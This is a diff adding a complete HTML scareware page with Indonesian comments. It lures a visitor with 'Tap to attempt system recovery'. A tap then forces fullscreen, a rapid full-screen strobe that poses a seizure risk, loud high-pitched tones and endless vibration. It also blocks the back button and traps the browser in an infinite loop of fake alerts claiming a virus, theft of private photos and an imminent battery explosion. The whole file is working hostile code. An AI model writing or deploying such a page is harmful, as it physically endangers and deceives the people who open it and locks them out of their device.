@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM RUSAK</title>
+    <style>
+        /* Bikin seluruh layar jadi area klik */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            cursor: none;
+        }
+
+        /* Overlay transparan yang nutupin seluruh layar */
+        #trap-zone {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .glitch-text {
+            font-size: 24px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* Animasi layar kedap-kedip parah */
+        .strobe {
+            animation: strobe-anim 0.05s infinite;
+        }
+        @keyframes strobe-anim {
+            0% { background-color: red; }
+            50% { background-color: blue; }
+            100% { background-color: black; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="trap-zone" onclick="launchTerror()">
+        <div class="glitch-text">
+            <h1 id="msg">Clik your screen an enjoy</h1>
+            <p id="sub-msg">Tap to attempt system recovery</p>
+        </div>
+    </div>
+
+    <script>
+        function launchTerror() {
+            // 1. Langsung aktifin Fullscreen
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            
+            // 2. Ubah tampilan jadi mode gila (Strobe)
+            document.body.classList.add('strobe');
+            document.getElementById('msg').innerHTML = "SYSTEM HIJACKED";
+            document.getElementById('sub-msg').innerHTML = "UPLOADING DATA...";
+
+            // 3. Suara Frekuensi Tinggi (Telinga Berdenging)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            function playDistortion(freq, type, vol) {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                gain.gain.value = vol;
+                osc.start();
+                
+                // Suara naik turun biar risih
+                setInterval(() => {
+                    osc.frequency.exponentialRampToValueAtTime(freq + 2000, audioCtx.currentTime + 0.3);
+                    osc.frequency.exponentialRampToValueAtTime(freq, audioCtx.currentTime + 0.6);
+                }, 1000);
+            }
+
+            playDistortion(3500, 'sine', 1); // Suara melengking
+            playDistortion(150, 'sawtooth', 0.5); // Suara kasar
+
+            // 4. Getar HP tanpa henti
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([400, 200, 400, 200, 800]);
+                }, 1000);
+            }
+
+            // 5. Spam Alert (Mengunci interaksi)
+            setTimeout(() => {
+                while(true) {
+                    alert("VIRUS DETECTED: TROJAN.WIN32.GEN");
+                    alert("SENDING PRIVATE PHOTOS TO SERVER...");
+                    alert("BATTERY EXPLOSION IMMINENT!");
+                    window.history.pushState(null, "", window.location.href);
+                }
+            }, 300);
+        }
+
+        // Anti tombol Back
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, "", window.location.href);
+        };
+    </script>
+</body>
+</html>
